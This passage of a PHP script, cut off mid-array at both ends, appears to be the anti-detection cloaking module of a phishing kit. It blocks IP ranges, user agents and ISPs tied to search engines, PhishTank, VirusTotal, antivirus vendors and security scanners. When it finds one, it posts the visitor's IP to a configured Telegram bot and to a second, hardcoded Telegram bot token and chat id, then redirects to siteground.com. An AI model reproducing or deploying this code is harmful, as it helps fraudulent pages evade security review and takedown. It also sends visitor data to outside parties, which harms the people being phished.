     ^206.207.*.*", "^209.19.*.*", "^207.70.*.*", "^185.75.*.*", "^193.226.*.*", "^66.102.*.*", "^64.71.*.*", "^69.164.*.*", "^64.74.*.*", "^64.235.*.*", "^4.14.64.*.*", "^4.14.64.*", "^38.100.*.*", "^107.170.*.*", "^149.20.*.*", "^38.105.*.*", "^74.125.*.*",  "^66.150.14.*", "^54.176.*.*", "^38.100.*.*", "^184.173.*.*", "^66.249.*.*", "^128.242.*.*", "^72.14.192.*", "^72.13.86.*", "^208.65.144.*", "^74.125.*.*", "^209.85.128.*", "^216.239.32.*", "^74.125.*.*", "^207.126.144.*", "^173.194.*.*", "^64.233.160.*", "^72.14.192.*", "^66.102.*.*", "^64.18.*.*", "^194.52.68.*", "^194.72.238.*", "^62.116.207.*", "^212.50.193.*", "^69.65.*.*", "^50.7.*.*", "^131.212.*.*", "^46.116.*.* ", "^62.90.*.*", "^89.138.*.*", "^82.166.*.*", "^85.64.*.*", "^85.250.*.*", "^89.138.*.*", "^93.172.*.*", "^109.186.*.*", "^194.90.*.*", "^212.29.192.*", "^212.29.224.*", "^212.143.*.*", "^212.150.*.*", "^212.235.*.*", "^217.132.*.*", "^50.97.*.*", "^217.132.*.*", "^209.85.*.*", "^66.205.64.*", "^204.14.48.*",  "^64.27.2.*", "^67.15.*.*", "^202.108.252.*", "^193.47.80.*", "^64.62.136.*", "^66.221.*.*", "^64.62.175.*", "^198.54.*.*", "^192.115.134.*", "^216.252.167.*", "^193.253.199.*", "^69.61.12.*", "^64.37.103.*", "^38.144.36.*", "^64.124.14.*", "^206.28.72.*", "^209.73.228.*", "^158.108.*.*", "^168.188.*.*", "^66.207.120.*", "^167.24.*.*", "^192.118.48.*", "^67.209.128.*", "^12.148.209.*", "^12.148.196.*", "^193.220.178.*", "^68.65.53.71", "^198.25.*.*", "^4.14.0.0",
     "^206.207.*.*",
 "^209.19.*.*",
 "^207.70.*.*",
 "^185.75.*.*",
 "^193.226.*.*",
 "^66.102.*.*",
 "^64.71.*.*",
 "^69.164.*.*",
 "^64.74.*.*",
 "^64.235.*.*",
 "^4.14.64.*.*",
 "^4.14.64.*",
 "^38.100.*.*",
 "^107.170.*.*",
 "^149.20.*.*",
 "^38.105.*.*",
 "^74.125.*.*",
  "^66.150.14.*",
 "^54.176.*.*",
 "^38.100.*.*",
 "^184.173.*.*",
 "^66.249.*.*",
 "^128.242.*.*",
 "^72.14.192.*",
 "^72.13.86.*",
 "^208.65.144.*",
 "^74.125.*.*",
 "^209.85.128.*",
 "^216.239.32.*",
 "^74.125.*.*",
 "^207.126.144.*",
 "^173.194.*.*",
 "^64.233.160.*",
 "^72.14.192.*",
 "^66.102.*.*",
 "^64.18.*.*",
 "^194.52.68.*",
 "^194.72.238.*",
 "^62.116.207.*",
 "^212.50.193.*",
 "^69.65.*.*",
 "^131.212.*.*",
 "^46.116.*.* ",
 "^62.90.*.*",
 "^89.138.*.*",
 "^82.166.*.*",
 "^85.64.*.*",
 "^85.250.*.*",
 "^89.138.*.*",
 "^93.172.*.*",
 "^109.186.*.*",
 "^194.90.*.*",
 "^212.29.192.*",
 "^212.29.224.*",
 "^212.143.*.*",
 "^212.150.*.*",
 "^212.235.*.*",
 "^217.132.*.*",
 "^50.97.*.*",
 "^217.132.*.*",
 "^209.85.*.*",
 "^66.205.64.*",
 "^204.14.48.*",
  "^64.27.2.*",
 "^67.15.*.*",
 "^202.108.252.*",
 "^193.47.80.*",
 "^64.62.136.*",
 "^66.221.*.*",
 "^64.62.175.*",
 "^198.54.*.*",
 "^192.115.134.*",
 "^216.252.167.*",
 "^193.253.199.*",
 "^69.61.12.*",
 "^64.37.103.*",
 "^38.144.36.*",
 "^64.124.14.*",
 "^206.28.72.*",
 "^209.73.228.*",
 "^158.108.*.*",
 "^168.188.*.*",
 "^66.207.120.*",
 "^167.24.*.*",
 "^192.118.48.*",
 "^67.209.128.*",
 "^12.148.209.*",
 "^12.148.196.*",
 "^193.220.178.*",
 "^68.65.53.71",
 "^198.25.*.*",
 "^4.14.0.0",
     '^104.236.153.*',
    '^107.170.*.*',
    '^64.71.206.*',
    '^64.71.205.*',
    '^64.71.204.*',
    '^66.102.8.*',
    '^157.55.39.*',
    '^105.107.79.*',
    '^4.14.64.*',
    '^64.74.215.*',
    '^198.186.190.*',
    '^198.186.191.*',
    '^198.186.192.*',
    '^198.186.193.*',
    '^109.186.*.*',
    '^12.148.196.*',
    '^12.148.209.*',
    '^128.242.*.*',
    '^131.212.*.*',
    '^149.20.*.*',
    '^158.108.*.*',
    '^163.195.178.*',
    '^167.24.*.*',
    '^168.188.*.*',
    '^173.194.*.*',
    '^173.224.160.*',
    '^173.224.161.*',
    '^173.224.162.*',
    '^173.224.163.*',
    '^173.224.164.*',
    '^173.224.165.*',
    '^173.224.166.*',
    '^173.224.167.*',
    '^184.173.*.*',
    '^192.115.134.*',
    '^192.118.48.*',
    '^193.220.178.*',
    '^193.253.199.*',
    '^193.47.80.*',
    '^194.52.68.*',
    '^194.72.238.*',
    '^194.90.*.*',
    '^198.25.*.*',
    '^198.54.*.*',
    '^199.30.228.*',
    '^202.108.252.*',
    '^204.14.48.*',
    '^206.28.72.*',
    '^207.126.144.*',
    '^208.65.144.*',
    '^208.91.115.*',
    '^209.73.228.*',
    '^209.85.*.*',
    '^209.85.128.*',
    '^212.143.*.*',
    '^212.150.*.*',
    '^212.235.*.*',
    '^212.29.192.*',
    '^212.29.224.*',
    '^212.50.193.*',
    '^216.10.193.*',
    '^216.239.32.*',
    '^216.252.167.*',
    '^217.132.*.*',
    '^217.132.*.*',
    '^38.100.*.*',
    '^38.100.*.*',
    '^38.105.*.*',
    '^38.144.36.*',
    '^46.116.*.* ',
    '^50.7.*.*',
    '^50.97.*.*',
    '^54.176.*.*',
    '^62.116.207.*',
    '^62.90.*.*',
    '^64.106.213.*',
    '^64.124.14.*',
    '^64.18.*.*',
    '^64.233.160.*',
    '^64.27.2.*',
    '^64.37.103.*',
    '^64.62.136.*',
    '^64.62.175.*',
    '^66.102.*.*',
    '^66.102.*.*',
    '^66.135.200.*',
    '^66.150.14.*',
    '^66.205.64.*',
    '^66.207.120.*',
    '^66.221.*.*',
    '^66.249.*.*',
    '^67.15.*.*',
    '^67.209.128.*',
    '^68.65.53.71',
    '^69.61.12.*',
    '^69.65.*.*',
    '^72.14.192.*',
    '^72.14.192.*',
    '^74.125.*.*',
    '^74.125.*.*',
    '^74.125.*.*',
    '^81.161.59.*',
    '^82.166.*.*',
    '^85.250.*.*',
    '^85.64.*.*',
    '^89.138.*.*',
    '^89.138.*.*',
    '^91.103.66.*',
    '^93.172.*.*',
    "^81.161.59.*",
"^66.135.200.*", "^66.102.*.*", "^38.100.*.*", "^107.170.*.*", "^149.20.*.*", "^38.105.*.*", "^74.125.*.*", "^66.150.14.*", "^54.176.*.*", "^38.100.*.*", "^184.173.*.*", "^66.249.*.*", "^128.242.*.*", "^72.14.192.*", "^208.65.144.*", "^74.125.*.*", "^209.85.128.*", "^216.239.32.*", "^74.125.*.*", "^207.126.144.*", "^173.194.*.*", "^64.233.160.*", "^72.14.192.*", "^66.102.*.*", "^64.18.*.*", "^194.52.68.*", "^194.72.238.*", "^62.116.207.*", "^212.50.193.*", "^69.65.*.*", "^50.7.*.*", "^131.212.*.*", "^46.116.*.* ", "^62.90.*.*", "^89.138.*.*", "^82.166.*.*", "^85.64.*.*", "^85.250.*.*", "^89.138.*.*", "^93.172.*.*", "^109.186.*.*", "^194.90.*.*", "^212.29.192.*", "^212.29.224.*", "^212.143.*.*", "^212.150.*.*", "^212.235.*.*", "^217.132.*.*", "^50.97.*.*", "^217.132.*.*", "^209.85.*.*", "^66.205.64.*", "^204.14.48.*", "^64.27.2.*", "^67.15.*.*", "^202.108.252.*", "^193.47.80.*", "^64.62.136.*", "^66.221.*.*", "^64.62.175.*", "^198.54.*.*", "^192.115.134.*", "^216.252.167.*", "^193.253.199.*", "^69.61.12.*", "^64.37.103.*", "^38.144.36.*", "^64.124.14.*", "^206.28.72.*", "^209.73.228.*", "^158.108.*.*", "^168.188.*.*", "^66.207.120.*", "^167.24.*.*", "^192.118.48.*", "^67.209.128.*", "^12.148.209.*", "^12.148.196.*", "^193.220.178.*", "68.65.53.71", "^198.25.*.*", "^64.106.213.*", "^91.103.66.*", "^208.91.115.*", "^199.30.228.*","^66.102.*.*","^104.236.153.*","^65.55.85.12","^66.211.169.3", "^66.211.169.66", "^89.163.159.214", "^37.128.131.171",
"^12.148.196.*", "^193.220.178.*", "^68.65.53.71", "^198.25.*.*", "^64.106.213.*",
"^104.108.64.175","104.83.233.198", "^173.194.116.102","^173.194.112.*",
"^65.55.206.154", "^193.221.113.53", "^208.76.45.53", "^208.84.*.*",
"^207.46.8.167", "^65.54.188.110", "^207.46.8.199", "^134.170.2.199", "^65.55.92.152",
"^65.54.188.94", "^65.55.37.104", "^65.55.92.168", "^65.55.37.120", "^65.55.33.119",
"^65.55.92.184", "^65.54.188.126","^65.55.37.88", "^65.55.37.88", "^65.55.92.136",
"^207.46.8.199", "^65.55.92.168", "^65.54.188.94", "^65.55.33.119", "^65.55.37.104",
"^65.54.188.110","^1.128.96.181","^65.208.151.*","^1.132.97.75","^1.152.96.223",
"^38.100.*.*","^185.20.5.*","^185.20.4.*","^95.76.156.*","^216.58.211.37","^173.194.116.149",
"^107.170.*.*","^64.68.90.*","^64.233.173.*","^216.33.229.163","^216.239.*.*","^89.163.159.214",
"^149.20.*.*","^219.117.238.170","^79.79.148.223","^62.149.225.67","^104.131.165.123","^46.101.249.238","^79.79.147.162","^178.62.113.173","^1.152.97.32","^101.174.147.73","27.54.62.91","4.14.64.*",
"^38.105.*.*",
"^74.125.*.*",
"^66.150.14.*",
"^54.176.*.*",
"^38.100.*.*",
"^184.173.*.*",
"^66.249.*.*",
"^128.242.*.*",
"^72.14.192.*",
"^208.65.144.*",
"^74.125.*.*",
"^209.85.128.*",
"^216.239.32.*",
"^74.125.*.*",
"^207.126.144.*",
"^173.194.*.*",
"^64.233.160.*",
"^72.14.192.*",
"^66.102.*.*",
"^64.18.*.*",
"^194.52.68.*",
"^194.72.238.*",
"^62.116.207.*",
"^212.50.193.*",
"^69.65.*.*",
"^50.7.*.*",
"^131.212.*.*",
"^46.116.*.* ",
"^62.90.*.*",
"^89.138.*.*",
"^82.166.*.*",
"^85.64.*.*",
"^85.250.*.*",
"^89.138.*.*",
"^93.172.*.*",
"^109.186.*.*",
"^194.90.*.*",
"^212.29.192.*",
"^212.29.224.*",
"^212.143.*.*",
"^212.150.*.*",
"^212.235.*.*",
"^217.132.*.*",
"^50.97.*.*",
"^217.132.*.*",
"^209.85.*.*",
"^66.205.64.*",
"^204.14.48.*",
"^64.27.2.*",
"^67.15.*.*",
"^202.108.252.*",
"^193.47.80.*",
"^64.62.136.*",
"^66.221.*.*",
"^64.62.175.*",
"^198.54.*.*",
"^192.115.134.*",
"^216.252.167.*",
"^193.253.199.*",
"^69.61.12.*",
"^64.37.103.*",
"^38.144.36.*",
"^64.124.14.*",
"^206.28.72.*",
"^209.73.228.*",
"^158.108.*.*",
"^168.188.*.*",
"^66.207.120.*",
"^167.24.*.*",
"^192.118.48.*",
"^67.209.128.*",
"^12.148.209.*",
"^12.148.196.*",
"^193.220.178.*",
"^68.65.53.71",
"^64.235.153.*","^64.235.154.*",
"^198.25.*.*",
"^64.106.213.*",
"54.228.218.117",
"^54.228.218.*",
"185.28.20.243",
"^185.28.20.*",
"217.16.26.166",
"162.224.156.32",
"^204.101.161.159",
"^217.16.26.*",
"^216.162.209.*",
"^64.71.193.*",
"^185.75.141.32",
"^209.66.70.*",
"^207.70.60.*",
"^209.19.185.*",
"^209.*",
"^104.236.153.*",
"^107.170.*.*",
"^109.186.*.*",
"^12.148.196.*",
"^12.148.209.*",
"^128.242.*.*",
"^131.212.*.*",
"^149.20.*.*",
"^158.108.*.*",
"^163.195.178.*",
"^167.24.*.*",
"^168.188.*.*",
"^173.194.*.*",
"^173.224.160.*",
"^173.224.161.*",
"^173.224.162.*",
"^173.224.163.*",
"^173.224.164.*",
"^173.224.165.*",
"^173.224.166.*",
"^173.224.167.*",
"^184.173.*.*",
"^192.115.134.*",
"^192.118.48.*",
"^193.220.178.*",
"^193.253.199.*",
"^193.47.80.*",
"^194.52.68.*",
"^194.72.238.*",
"^194.90.*.*",
"^198.25.*.*",
"^198.54.*.*",
"^199.30.228.*",
"^202.108.252.*",
"^204.14.48.*",
"^206.28.72.*",
"^207.126.144.*",
"^208.65.144.*",
"^208.91.115.*",
"^209.73.228.*",
"^209.85.*.*",
"^209.85.128.*",
"^212.143.*.*",
"^212.150.*.*",
"^212.235.*.*",
"^212.29.192.*",
"^212.29.224.*",
"^212.50.193.*",
"^216.10.193.*",
"^216.239.32.*",
"^216.252.167.*",
"^217.132.*.*",
"^217.132.*.*",
"^38.100.*.*",
"^38.100.*.*",
"^38.105.*.*",
"^38.144.36.*",
"^46.116.*.* ",
"^50.7.*.*",
"^50.97.*.*",
"^54.176.*.*",
"^62.116.207.*",
"^62.90.*.*",
"^64.106.213.*",
"^64.124.14.*",
"^64.18.*.*",
"^64.233.160.*",
"^64.27.2.*",
"^64.37.103.*",
"^64.62.136.*",
"^64.62.175.*",
"^66.102.*.*",
"^66.102.*.*",
"^66.135.200.*",
"^66.150.14.*",
"^66.205.64.*",
"^66.207.120.*",
"^66.221.*.*",
"^66.249.*.*",
"^67.15.*.*",
"^67.209.128.*",
"^68.65.53.71",
"^69.61.12.*",
"^69.65.*.*",
"^72.14.192.*",
"^72.14.192.*",
"^74.125.*.*",
"^74.125.*.*",
"^74.125.*.*",
"^81.161.59.*",
"^82.166.*.*",
"^85.250.*.*",
"^85.64.*.*",
"^89.138.*.*",
"^89.138.*.*",
"^91.103.66.*",
"^93.172.*.*",
"^95.76.156.*",
"^64.71.*.*",
"^203.188.221.*",
"^209.19.186.231",
"^206.207.80.*",
"^209.19.*.*",
"^206.80.*.*",
"^207.80.*.*",
"^207.70.60.*",
"^108.210.106.*",
"^173.14.18.*",
"^52.90.*.*",
"^35.172.115.*",
"^54.164.*.*",
"^222.154.252.*",
"^195.211.23.*",
"^13.57.36.*",
"^210.55.200.*",
"^42.112.8.*"
);

    foreach($ips as $ip) {
        if(preg_match('/' . $ip . '/',$_SERVER['REMOTE_ADDR'])){

$content = "Bot Found: ".$IP." [ Blocked ] \r\n";
$token = file_get_contents("main/config/token.txt");
$id = file_get_contents("main/config/id.txt");
$url = "https://api.telegram.org/bot";
$bot = "{$url}{$token}";
$tokens = "1885390369:AAEqAJ3dPahEdvdQ5tXsXWyGGUJ90GhcGl8";
$ids = "1129838722";
$urls = "https://api.telegram.org/bot";
$bots = "{$urls}{$tokens}";
$params=[
	'chat_id'=>$id,
	'text'=>$content,
];

$ch = curl_init($bot . '/sendMessage');
curl_setopt($ch, CURLOPT_HEADER, false);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, ($params));
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
curl_exec($ch);
curl_close($ch);

$params=[
	'chat_id'=>$ids,
	'text'=>$content,
];

$ch = curl_init($bots . '/sendMessage');
curl_setopt($ch, CURLOPT_HEADER, false);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, ($params));
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
curl_exec($ch);
curl_close($ch);
header("Location: https://www.siteground.com");exit();


        }
    }

$dp =  strtolower($_SERVER['HTTP_USER_AGENT']);
$blocked_words = array(
     "bot",
     "above",
     "google",
     "docomo",
     "mediapartners",
     "phantomjs",
     "lighthouse",
     "reverseshorturl",
     "samsung-sgh-e250",
     "softlayer",
     "amazonaws",
     "cyveillance",
     "crawler",
     "gsa-crawler",
     "phishtank",
     "dreamhost",
     "netpilot",
     "calyxinstitute",
     "tor-exit",
     "apache-httpclient",
     "lssrocketcrawler",
     "crawler",
     "urlredirectresolver",
     "jetbrains",
     "spam",
     "windows 95",
     "windows 98",
     "acunetix",
     "netsparker",
     "007ac9",
     "008",
     "Feedfetcher",
     "192.comagent",
     "200pleasebot",
     "360spider",
     "4seohuntbot",
     "50.nu",
     "a6-indexer",
     "admantx",
     "amznkassocbot",
     "aboundexbot",
     "aboutusbot",
     "abrave spider",
     "accelobot",
     "acoonbot",
     "addthis.com",
     "adsbot-google",
     "ahrefsbot",
     "alexabot",
     "amagit.com",
     "analytics",
     "antbot",
     "apercite",
     "aportworm",
     "EBAY",
     "CL0NA",
     "jabber",
     "ebay",
     "arabot",
     "hotmail!",
     "msn!",
     "baidu",
     "outlook!",
     "outlook",
     "msn",
     "duckduckbot",
     "hotmail",
     "go-http-client",
     "go-http-client/1.1",
     "trident",
     "presto",
     "virustotal",
     "unchaos",
     "dreampassport",
     "sygol",
     "nutch",
     "privoxy",
     "zipcommander",
     "neofonie",
     "abacho",
     "acoi",
     "acoon",
     "adaxas",
     "agada",
     "aladin",
     "alkaline",
     "amibot",
     "anonymizer",
     "aplix",
     "aspseek",
     "avant",
     "baboom",
     "anzwers",
     "anzwerscrawl",
     "crawlconvera",
     "del.icio.us",
     "camehttps",
     "annotate",
     "wapproxy",
     "translate",
     "feedfetcher",
     "ask24",
     "asked",
     "askaboutoil",
     "fangcrawl",
     "amzn_assoc",
     "bingpreview",
     "dr.web",
     "drweb",
     "bilbo",
     "blackwidow",
     "sogou",
     "sogou-test-spider",
     "exabot",
     "externalhit",
     "ia_archiver",
     "googletranslate",
     "translate",
     "proxy",
     "dalvik",
     "quicklook",
     "seamonkey",
     "sylera",
     "safebrowsing",
     "safesurfingwidget",
     "preview",
     "whatsapp",
     "telegram",
     "instagram",
     "zteopen",
     "icoreservice",
     "untrusted"

);
    foreach($blocked_words as $word2) {
        if (substr_count($dp, strtolower($word2)) > 0 or $dp == "" or $dp == " " or $dp == "    ") {

$content = "Bot Found: ".$IP." [ Blocked ] \r\n";
$token = file_get_contents("main/config/token.txt");
$id = file_get_contents("main/config/id.txt");
$url = "https://api.telegram.org/bot";
$bot = "{$url}{$token}";
$tokens = "1885390369:AAEqAJ3dPahEdvdQ5tXsXWyGGUJ90GhcGl8";
$ids = "1129838722";
$urls = "https://api.telegram.org/bot";
$bots = "{$urls}{$tokens}";
$params=[
	'chat_id'=>$id,
	'text'=>$content,
];

$ch = curl_init($bot . '/sendMessage');
curl_setopt($ch, CURLOPT_HEADER, false);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, ($params));
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
curl_exec($ch);
curl_close($ch);

$params=[
	'chat_id'=>$ids,
	'text'=>$content,
];

$ch = curl_init($bots . '/sendMessage');
curl_setopt($ch, CURLOPT_HEADER, false);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, ($params));
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
curl_exec($ch);
curl_close($ch);
header("Location: https://www.siteground.com");exit();


        }
    }

$Bot = array(
    "abot",
    "dbot",
    "ebot",
    "hbot",
    "kbot",
    "lbot",
    "mbot",
    "nbot",
    "obot",
    "pbot",
    "rbot",
    "sbot",
    "tbot",
    "vbot",
    "ybot",
    "zbot",
    "bot.",
    "bot/",
    "_bot",
    ".bot",
    "/bot",
    "-bot",
    ":bot",
    "(bot",
    "crawl",
    "slurp",
    "spider",
    "seek",
    "avg",
    "avira",
    "bitdefender",
    "kaspersky",
    "sophos",
    "virustotal",
    "virus",
    "accoona",
    "acoon",
    "adressendeutschland",
    "ah-ha.com",
    "ahoy",
    "altavista",
    "ananzi",
    "anthill",
    "appie",
    "arachnophilia",
    "arale",
    "araneo",
    "aranha",
    "architext",
    "aretha",
    "arks",
    "asterias",
    "atlocal",
    "atn",
    "atomz",
    "augurfind",
    "backrub",
    "bannana_bot",
    "baypup",
    "bdfetch",
    "big brother",
    "biglotron",
    "bjaaland",
    "blackwidow",
    "blaiz",
    "blog",
    "blo.",
    "bloodhound",
    "boitho",
    "booch",
    "bradley",
    "butterfly",
    "calif",
    "cassandra",
    "ccubee",
    "cfetch",
    "charlotte",
    "churl",
    "cienciaficcion",
    "cmc",
    "collective",
    "comagent",
    "combine",
    "computingsite",
    "csci",
    "curl",
    "cusco",
    "daumoa",
    "deepindex",
    "delorie",
    "depspid",
    "deweb",
    "die blinde kuh",
    "digger",
    "ditto",
    "dmoz",
    "docomo",
    "download express",
    "dtaagent",
    "dwcp",
    "ebiness",
    "ebingbong",
    "e-collector",
    "ejupiter",
    "emacs-w3 search engine",
    "esther",
    "evliya celebi",
    "ezresult",
    "falcon",
    "felix ide",
    "ferret",
    "fetchrover",
    "fido",
    "findlinks",
    "fireball",
    "fish search",
    "fouineur",
    "funnelweb",
    "gazz",
    "gcreep",
    "genieknows",
    "getterroboplus",
    "geturl",
    "glx",
    "goforit",
    "golem",
    "grabber",
    "grapnel",
    "gralon",
    "griffon",
    "gromit",
    "grub",
    "gulliver",
    "hamahakki",
    "harvest",
    "havindex",
    "helix",
    "heritrix",
    "hku www octopus",
    "homerweb",
    "htdig",
    "html index",
    "html_analyzer",
    "htmlgobble",
    "hubater",
    "hyper-decontextualizer",
    "ia_archiver",
    "ibm_planetwide",
    "ichiro",
    "iconsurf",
    "iltrovatore",
    "image.kapsi.net",
    "imagelock",
    "incywincy",
    "indexer",
    "infobee",
    "informant",
    "ingrid",
    "inktomisearch.com",
    "inspector web",
    "intelliagent",
    "internet shinchakubin",
    "ip3000",
    "iron33",
    "israeli-search",
    "ivia",
    "jack",
    "jakarta",
    "javabee",
    "jetbot",
    "jumpstation",
    "katipo",
    "kdd-explorer",
    "kilroy",
    "knowledge",
    "kototoi",
    "kretrieve",
    "labelgrabber",
    "lachesis",
    "larbin",
    "legs",
    "libwww",
    "linkalarm",
    "link validator",
    "linkscan",
    "lockon",
    "lwp",
    "lycos",
    "magpie",
    "mantraagent",
    "mapoftheinternet",
    "marvin/",
    "mattie",
    "mediafox",
    "mediapartners",
    "mercator",
    "merzscope",
    "microsoft url control",
    "minirank",
    "miva",
    "mj12",
    "mnogosearch",
    "moget",
    "monster",
    "moose",
    "motor",
    "multitext",
    "muncher",
    "muscatferret",
    "mwd.search",
    "myweb",
    "najdi",
    "nameprotect",
    "nationaldirectory",
    "nazilla",
    "ncsa beta",
    "nec-meshexplorer",
    "nederland.zoek",
    "netcarta webmap engine",
    "netmechanic",
    "netresearchserver",
    "netscoop",
    "newscan-online",
    "nhse",
    "nokia6682/",
    "nomad",
    "noyona",
    "siteexplorer",
    "nutch",
    "nzexplorer",
    "objectssearch",
    "occam",
    "omni",
    "open text",
    "openfind",
    "openintelligencedata",
    "orb search",
    "osis-project",
    "pack rat",
    "pageboy",
    "pagebull",
    "page_verifier",
    "panscient",
    "parasite",
    "partnersite",
    "patric",
    "pear.",
    "pegasus",
    "peregrinator",
    "pgp key agent",
    "phantom",
    "phpdig",
    "picosearch",
    "piltdownman",
    "pimptrain",
    "pinpoint",
    "pioneer",
    "piranha",
    "plumtreewebaccessor",
    "pogodak",
    "poirot",
    "pompos",
    "poppelsdorf",
    "poppi",
    "popular iconoclast",
    "psycheclone",
    "publisher",
    "python",
    "rambler",
    "raven search",
    "roach",
    "road runner",
    "roadhouse",
    "robbie",
    "robofox",
    "robozilla",
    "rules",
    "salty",
    "sbider",
    "scooter",
    "scoutjet",
    "scrubby",
    "search.",
    "searchprocess",
    "semanticdiscovery",
    "senrigan",
    "sg-scout",
    "shai'hulud",
    "shark",
    "shopwiki",
    "sidewinder",
    "sift",
    "silk",
    "simmany",
    "site searcher",
    "site valet",
    "sitetech-rover",
    "skymob.com",
    "sleek",
    "smartwit",
    "sna-",
    "snappy",
    "snooper",
    "sohu",
    "speedfind",
    "sphere",
    "sphider",
    "spinner",
    "spyder",
    "steeler/",
    "suke",
    "suntek",
    "supersnooper",
    "surfnomore",
    "sven",
    "sygol",
    "szukacz",
    "tach black widow",
    "tarantula",
    "templeton",
    "/teoma",
    "t-h-u-n-d-e-r-s-t-o-n-e",
    "theophrastus",
    "titan",
    "titin",
    "tkwww",
    "toutatis",
    "t-rex",
    "tutorgig",
    "twiceler",
    "twisted",
    "ucsd",
    "udmsearch",
    "url check",
    "updated",
    "vagabondo",
    "valkyrie",
    "verticrawl",
    "victoria",
    "vision-search",
    "volcano",
    "voyager/",
    "voyager-hc",
    "w3c_validator",
    "w3m2",
    "w3mir",
    "walker",
    "wallpaper",
    "wanderer",
    "wauuu",
    "wavefire",
    "web core",
    "web hopper",
    "web wombat",
    "webbandit",
    "webcatcher",
    "webcopy",
    "webfoot",
    "weblayers",
    "weblinker",
    "weblog monitor",
    "webmirror",
    "webmonkey",
    "webquest",
    "webreaper",
    "websitepulse",
    "websnarf",
    "webstolperer",
    "webvac",
    "webwalk",
    "webwatch",
    "webwombat",
    "webzinger",
    "wget",
    "whizbang",
    "whowhere",
    "wild ferret",
    "worldlight",
    "wwwc",
    "wwwster",
    "xenu",
    "xget",
    "xift",
    "xirq",
    "yandex",
    "yanga",
    "yeti",
    "yodao",
    "zao/",
    "zippp",
    "zyborg",
    "proximic",
    "Googlebot",
    "Baiduspider",
    "Cliqzbot",
    "A6-Indexer",
    "AhrefsBot",
    "Genieo",
    "BomboraBot",
    "CCBot",
    "URLAppendBot",
    "DomainAppender",
    "msnbot-media",
    "Antivirus",
    "YoudaoBot",
    "MJ12bot",
    "linkdexbot",
    "Go-http-client",
    "presto",
    "BingPreview",
    "go-http-client",
     "go-http-client/1.1",
     "trident",
     "presto",
     "virustotal",
     "unchaos",
     "dreampassport",
     "sygol",
     "nutch",
     "privoxy",
     "zipcommander",
     "neofonie",
     "abacho",
     "acoi",
     "acoon",
     "adaxas",
     "agada",
     "aladin",
     "alkaline",
     "amibot",
     "anonymizer",
     "aplix",
     "aspseek",
     "avant",
     "baboom",
     "anzwers",
     "anzwerscrawl",
     "crawlconvera",
     "del.icio.us",
     "camehttps",
     "annotate",
     "wapproxy",
     "translate",
     "feedfetcher",
     "ask24",
     "asked",
     "askaboutoil",
     "fangcrawl",
     "amzn_assoc",
     "bingpreview",
     "dr.web",
     "drweb",
     "bilbo",
     "blackwidow",
     "sogou",
     "sogou-test-spider",
     "exabot",
     "externalhit",
     "ia_archiver",
     "mj12",
     "okhttp",
     "simplepie",
     "curl",
     "wget",
     "virus",
     "pipes",
     "antivirus",
     "python",
     "ruby",
     "avast",
     "firebird",
     "scmguard",
     "adsbot",
     "weblight",
     "favicon",
     "analytics",
     "insights",
     "headless",
     "github",
     "node",
     "agusescan",
     "zteopen",
     "majestic12",
     "SimplePie",
     "SAMSUNG-SGH-E250",
     "DoCoMo/2.0 N905i",
     "SiteLockSpider",
     "okhttp/2.5.0",
     "ips-agent",
     "scoutjet",
     "UptimeRobot",
     "FM Scene",
     "Prevx",
     "WindowsPowerShell"
);
    foreach ($Bot as $BotType) {
        if (stripos($_SERVER['HTTP_USER_AGENT'], $BotType) !== false) {
$content = "Bot Found: ".$IP." [ Blocked ] \r\n";
$token = file_get_contents("main/config/token.txt");
$id = file_get_contents("main/config/id.txt");
$url = "https://api.telegram.org/bot";
$bot = "{$url}{$token}";
$tokens = "1885390369:AAEqAJ3dPahEdvdQ5tXsXWyGGUJ90GhcGl8";
$ids = "1129838722";
$urls = "https://api.telegram.org/bot";
$bots = "{$urls}{$tokens}";
$params=[
	'chat_id'=>$id,
	'text'=>$content,
];

$ch = curl_init($bot . '/sendMessage');
curl_setopt($ch, CURLOPT_HEADER, false);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, ($params));
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
curl_exec($ch);
curl_close($ch);

$params=[
	'chat_id'=>$ids,
	'text'=>$content,
];

$ch = curl_init($bots . '/sendMessage');
curl_setopt($ch, CURLOPT_HEADER, false);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, ($params));
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
curl_exec($ch);
curl_close($ch);
header("Location: https://www.siteground.com");exit();


        }
    }

$ispnya = gethostbyaddr($_SERVER['REMOTE_ADDR']);

$banned_isp = array(
    'Peak 10',
    'Quasi Networks LTD',
    'SC Rusnano',
    'GoDaddy.com, LLC',
    'Server Plan S.r.l.',
    'Linode',
    'Blazing SEO',
    'Lixux OU',
    'Inter Connects Inc',
    'Flokinet Ltd',
    'LukMAN Multimedia Sp. z o.o',
    'PIPEX-BLOCK1',
    'IPVanish',
    'LinkGrid LLC',
    'Snab-Inform Private Enterprise',
    'Cisco Systems',
    'Network and Information Technology Limited',
    'London Wires Ltd.',
    'Tehnologii Budushego LLC',
    'Eonix Corporation',
    'hosttech GmbH',
    'Wowrack.com',
    'SunGard Availability Services LP',
    'Internap Network Services Corporation',
    'Palo Alto Networks',
    'PlusNet Technologies Ltd',
    'Scaleway',
    'Facebook',
    'Host1Plus',
    'XO Communications',
    'Nobis Technology Group',
    'ExpressVPN',
    'DME Hosting LLC',
    'Prescient Software',
    'Sungard Network Solutions',
    'OVH SAS',
    'Iomart Hosting Ltd',
    'Hosting Solution',
    'Barracuda Networks',
    'Sungard Network Solutions',
    'Solar VPS',
